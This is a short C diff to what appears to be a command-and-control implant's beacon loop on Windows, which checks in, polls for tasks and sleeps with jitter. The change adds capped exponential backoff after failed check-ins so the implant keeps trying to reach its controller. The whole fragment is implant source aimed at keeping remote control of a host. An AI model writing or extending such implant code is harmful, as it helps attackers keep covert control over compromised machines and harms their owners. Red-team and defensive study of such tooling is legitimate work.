@@ -1,14 +1,28 @@
 #include <beacon.h>
 #include <bcrypt.h>
 
+#define BACKOFF_MAX_MS  (5u * 60u * 1000u)  /* 5 min */
+
 DWORD WINAPI beacon_loop(LPVOID lpParam) {
     (void)lpParam;
 
     BEACON_CTX ctx = {0};
     beacon_ctx_init(&ctx);
 
+    DWORD fail_count = 0;
+
     while (1) {
-        beacon_checkin(&ctx);
+        if (!beacon_checkin(&ctx)) {
+            fail_count++;
+            ULONGLONG backoff = ctx.sleep_ms ? ctx.sleep_ms : 5000;
+            for (DWORD i = 0; i < fail_count && backoff < BACKOFF_MAX_MS; i++)
+                backoff *= 2;
+            if (backoff > BACKOFF_MAX_MS) backoff = BACKOFF_MAX_MS;
+            Sleep((DWORD)backoff);
+            continue;
+        }
+
+        fail_count = 0;
         beacon_poll_tasks(&ctx);
 
         DWORD jitter_ms = ctx.sleep_ms * ctx.jitter_pct / 100;
